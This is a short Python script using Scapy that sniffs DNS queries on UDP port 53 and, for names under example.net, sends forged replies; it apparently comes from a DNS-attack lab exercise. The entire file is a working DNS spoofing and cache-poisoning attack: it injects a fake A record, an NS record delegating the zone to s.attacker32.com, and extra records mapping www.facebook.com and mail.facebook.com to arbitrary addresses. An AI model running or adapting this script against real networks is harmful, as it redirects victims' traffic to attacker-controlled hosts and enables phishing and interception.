#!/usr/bin/python
from scapy.all import *
def spoof_dns(pkt):
    if (DNS in pkt and "example.net" in pkt[DNS].qd.qname):
        # Swap the source and destination IP address
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        # Swap the source and destination port number
        udp = UDP(dport=pkt[UDP].sport, sport=53)
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type="A",
                       ttl=259200, rdata="10.0.2.8")

        # The Authority Section
        NSsec1 = DNSRR(rrname="example.net", type="NS",
                       ttl=259200, rdata="s.attacker32.com")
        NSsec2 = DNSRR(rrname="example.net", type="NS",
                       ttl=259200, rdata="ns.example.net")

        # The Additional Section
        Addsec1 = DNSRR(rrname="s.attacker32.com", type="A",
                        ttl=259200, rdata="1.2.3.4")
        Addsec2 = DNSRR(rrname="ns.example.net", type="A",
                        ttl=259200, rdata="5.6.7.8")
        Addsec3 = DNSRR(rrname="www.facebook.com", type="A",
                        ttl=259200, rdata="3.4.5.6")
        Addsec4 = DNSRR(rrname="mail.facebook.com", type="A",
                        ttl=259200, rdata="2.2.2.2")

        Addsec = Addsec1/Addsec2/Addsec3/Addsec4
        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                  qdcount=1, ancount=1, nscount=2, arcount=4,
                  an=Anssec, ns=NSsec1/NSsec2 ,ar=Addsec)

        # Construct the entire IP packet and send it out
        spoofpkt = ip/udp/dns
        send(spoofpkt)
# Sniff UDP query packets and invoke spoof_dns().
print("Start Sniffing...")
pkt = sniff(filter="udp and dst port 53", prn=spoof_dns)